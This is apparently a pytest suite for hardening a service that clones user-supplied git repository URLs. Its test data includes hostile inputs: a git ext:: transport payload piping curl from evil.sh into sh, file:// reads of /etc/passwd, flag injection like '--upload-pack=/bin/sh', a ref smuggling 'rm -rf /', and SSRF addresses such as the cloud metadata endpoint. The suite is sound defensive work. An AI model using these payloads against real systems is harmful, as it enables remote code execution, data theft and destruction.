"""
Tests for repository fetching, with the emphasis on URL validation.

The clone URL is attacker-supplied: anyone who can add a repository controls
this string. `git clone` with an unconstrained URL is a remote code
execution primitive, so every rejection below corresponds to a concrete
attack, and each one is asserted to fail *before* any process is spawned.
"""

from __future__ import annotations

import subprocess
from pathlib import Path

import pytest

from app.indexing.source import (
    DEFAULT_ALLOWED_HOSTS,
    Checkout,
    SourceError,
    UnsafeSourceError,
    clone,
    directory_size,
    repo_name_from_url,
    validate_url,
)

# --- the attacks -----------------------------------------------------------

@pytest.mark.parametrize("url,attack", [
    ("ext::sh -c 'curl evil.sh|sh'", "git's ext transport executes a shell command"),
    ("ext::bash -c whoami", "same, another shell"),
    ("file:///etc/passwd", "reads a path on the host"),
    ("file://C:/Windows/System32", "same, Windows"),
    ("/etc/shadow", "bare local path"),
    ("../../../etc/passwd", "relative local path"),
    ("ssh://git@github.com/x/y.git", "ssh transport, key material in play"),
    ("git://github.com/x/y.git", "unauthenticated git protocol"),
    ("git+https://github.com/x/y", "pip-style scheme git does not validate as https"),
    ("--upload-pack=/bin/sh", "argument injection via a flag-shaped URL"),
    ("-u", "short flag"),
])
def test_dangerous_urls_are_rejected(url, attack):
    with pytest.raises(UnsafeSourceError):
        validate_url(url)


def test_rejection_happens_before_any_subprocess(monkeypatch, tmp_path):
    """
    Validation must be a gate, not a check performed alongside the clone.
    Fails loudly if anyone reorders it.
    """
    def explode(*a, **k):
        raise AssertionError("a subprocess was spawned for a rejected URL")

    monkeypatch.setattr(subprocess, "run", explode)
    with pytest.raises(UnsafeSourceError):
        clone("ext::sh -c evil", tmp_path / "out")


def test_unknown_hosts_are_rejected():
    """
    An allowlist, not a blocklist: a blocklist does not stop SSRF against
    internal addresses.
    """
    for url in (
        "https://169.254.169.254/latest/meta-data/",
        "https://localhost/repo.git",
        "https://10.0.0.5/internal.git",
        "https://evil.example.com/x.git",
    ):
        with pytest.raises(UnsafeSourceError, match="not in the allowed list"):
            validate_url(url)


def test_embedded_password_is_rejected():
    with pytest.raises(UnsafeSourceError, match="credentials"):
        validate_url("https://user:secret@github.com/x/y.git")


def test_a_username_without_a_password_is_allowed():
    assert validate_url("https://github.com/owner/repo.git")


def test_empty_and_oversized_urls_are_rejected():
    with pytest.raises(UnsafeSourceError):
        validate_url("")
    with pytest.raises(UnsafeSourceError):
        validate_url("https://github.com/" + "a" * 3000)


def test_refs_are_constrained():
    """A ref reaches the git command line; it must not look like a flag."""
    with pytest.raises(UnsafeSourceError, match="ref"):
        clone("https://github.com/x/y.git", Path("/tmp/x"), ref="--upload-pack=sh")
    with pytest.raises(UnsafeSourceError, match="ref"):
        clone("https://github.com/x/y.git", Path("/tmp/x"), ref="a;rm -rf /")


# --- accepted URLs ---------------------------------------------------------

@pytest.mark.parametrize("url", [
    "https://github.com/pallets/flask.git",
    "https://github.com/pallets/flask",
    "https://gitlab.com/group/sub/project.git",
    "https://bitbucket.org/team/repo.git",
    "https://codeberg.org/user/repo",
])
def test_ordinary_urls_are_accepted(url):
    assert validate_url(url) == url


def test_allowed_hosts_can_be_overridden():
    custom = frozenset({"git.internal.example"})
    assert validate_url("https://git.internal.example/x.git", custom)
    with pytest.raises(UnsafeSourceError):
        validate_url("https://github.com/x/y.git", custom)


def test_default_host_list_is_not_empty():
    assert "github.com" in DEFAULT_ALLOWED_HOSTS


@pytest.mark.parametrize("url,expected", [
    ("https://github.com/pallets/flask.git", "flask"),
    ("https://github.com/pallets/flask", "flask"),
    ("https://gitlab.com/a/b/c.git", "c"),
    ("https://github.com/owner/repo/", "repo"),
])
def test_repo_name_extraction(url, expected):
    assert repo_name_from_url(url) == expected


# --- git invocation --------------------------------------------------------

def test_clone_never_uses_a_shell(monkeypatch, tmp_path):
    """`shell=True` with any attacker-influenced argument is the whole risk."""
    captured = {}

    def fake_run(args, **kwargs):
        captured["args"] = args
        captured["kwargs"] = kwargs
        raise subprocess.TimeoutExpired(args, 1)

    monkeypatch.setattr(subprocess, "run", fake_run)
    with pytest.raises(SourceError):
        clone("https://github.com/x/y.git", tmp_path / "out")

    assert captured["kwargs"].get("shell") is not True
    assert isinstance(captured["args"], list)


def test_clone_is_shallow_and_refuses_submodules(monkeypatch, tmp_path):
    """
    A submodule's URL is chosen by the cloned repository, not by us.
    Recursing would follow an attacker-controlled URL past validation.
    """
    captured = {}

    def fake_run(args, **kwargs):
        captured["args"] = args
        raise subprocess.TimeoutExpired(args, 1)

    monkeypatch.setattr(subprocess, "run", fake_run)
    with pytest.raises(SourceError):
        clone("https://github.com/x/y.git", tmp_path / "out")

    args = captured["args"]
    assert "--depth" in args and "1" in args
    assert "--no-recurse-submodules" in args
    assert "--" in args, "URL must follow -- so it cannot be read as a flag"
    assert args.index("--") < args.index("https://github.com/x/y.git")


def test_git_environment_disables_interactive_prompts(monkeypatch, tmp_path):
    """An auth prompt inside a worker is a hang, not a login."""
    captured = {}

    def fake_run(args, **kwargs):
        captured["env"] = kwargs.get("env", {})
        raise subprocess.TimeoutExpired(args, 1)

    monkeypatch.setattr(subprocess, "run", fake_run)
    with pytest.raises(SourceError):
        clone("https://github.com/x/y.git", tmp_path / "out")

    env = captured["env"]
    assert env["GIT_TERMINAL_PROMPT"] == "0"
    assert env["GIT_ASKPASS"] == ""
    assert env["GIT_CONFIG_NOSYSTEM"] == "1"


def test_git_progress_output_is_not_reported_as_an_error(monkeypatch, tmp_path):
    class Result:
        returncode = 128
        stdout = ""
        stderr = (
            "Cloning into 'x'...\n"
            "Receiving objects:  73% (100/137)\n"
            "remote: Enumerating objects: 137\n"
            "fatal: repository not found\n"
        )

    monkeypatch.setattr(subprocess, "run", lambda *a, **k: Result())
    with pytest.raises(SourceError) as exc:
        clone("https://github.com/x/y.git", tmp_path / "out")

    msg = str(exc.value)
    assert "repository not found" in msg
    assert "Receiving objects" not in msg
    assert "Cloning into" not in msg


def test_missing_git_binary_is_reported_clearly(monkeypatch, tmp_path):
    monkeypatch.setattr(
        subprocess, "run",
        lambda *a, **k: (_ for _ in ()).throw(FileNotFoundError("git")),
    )
    with pytest.raises(SourceError, match="git is not installed"):
        clone("https://github.com/x/y.git", tmp_path / "out")


# --- helpers ---------------------------------------------------------------

def test_directory_size(tmp_path):
    (tmp_path / "a.txt").write_bytes(b"x" * 100)
    (tmp_path / "sub").mkdir()
    (tmp_path / "sub" / "b.txt").write_bytes(b"y" * 250)
    assert directory_size(tmp_path) == 350


def test_checkout_dataclass_shape():
    c = Checkout(path=Path("/tmp/x"), commit_sha="abc", default_branch="main", name="x")
    assert c.commit_sha == "abc" and c.name == "x"
